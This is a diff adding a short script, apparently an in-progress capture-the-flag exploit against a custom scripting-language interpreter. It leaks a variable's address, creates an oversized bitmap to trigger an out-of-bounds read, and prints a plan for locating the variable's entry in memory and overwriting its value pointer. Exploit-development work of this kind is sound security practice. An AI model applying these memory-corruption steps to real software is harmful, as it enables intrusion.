@@ -1,0 +1,33 @@
+print("=== OOB Read to Find Variable Entry ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Scanning backwards from targetaddr");
+print("Looking for target name pattern");
+print("Variable entry: name at offset 0x00, type at 0x20, value_ptr at 0x28");
+
+print("Strategy:");
+print("1. Read bits from y=0, different x values");
+print("2. Look for ASCII pattern matching target");
+print("3. When found, calculate entry_addr");
+print("4. value_ptr = entry_addr + 0x28");
+
+print("Note: This is a simplified approach");
+print("Full implementation would scan systematically");
+
+print("Alternative: Try common offsets");
+print("entry_addr candidates:");
+print("  targetaddr - 0x100");
+print("  targetaddr - 0x200");
+print("  targetaddr - 0x300");
+print("  targetaddr - 0x400");
+
+print("For each candidate, try writing a test value");
+print("If target variable changes, we found it!");
+
